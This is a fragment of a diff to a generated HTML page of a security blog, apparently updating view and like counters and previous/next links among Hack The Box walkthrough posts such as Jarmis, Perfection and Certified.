-        var oid_likes = "likes_posts\/1741895312886-Support-Walkthrough(HTB)\/index.md"
+        var oid = "views_posts\/1742061149402-Jarmis-Walkthrough(HTB)\/index.md"
+        var oid_likes = "likes_posts\/1742061149402-Jarmis-Walkthrough(HTB)\/index.md"
       </script>
       
       
@@ -1717,7 +1962,7 @@ ACLs ensure that only authorized users can access specific resources and perform
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/Secure-The-Throne/posts/1741762551259-caption-walkthroughhtb/">
+            <a class="flex group mr-3" href="/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1729,11 +1974,11 @@ ACLs ensure that only authorized users can access specific resources and perform
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Caption Walkthrough(HTB)</span
+                  >Perfection Walkthrough(HTB)</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-03-12T00:00:00&#43;00:00">12 March 2025</time>
+                    <time datetime="2025-03-14T00:00:00&#43;00:00">14 March 2025</time>
                   
                 </span>
               </span>
@@ -1742,15 +1987,15 @@ ACLs ensure that only authorized users can access specific resources and perform
         </span>
         <span>
           
-            <a class="flex text-right group ml-3" href="/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/">
+            <a class="flex text-right group ml-3" href="/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/">
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Perfection Walkthrough(HTB)</span
+                  >Certified Walkthrough(HTB)</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-03-14T00:00:00&#43;00:00">14 March 2025</time>
+                    <time datetime="2025-03-15T00:00:00&#43;00:00">15 March 2025</time>
                   
                 </span>
               </span>
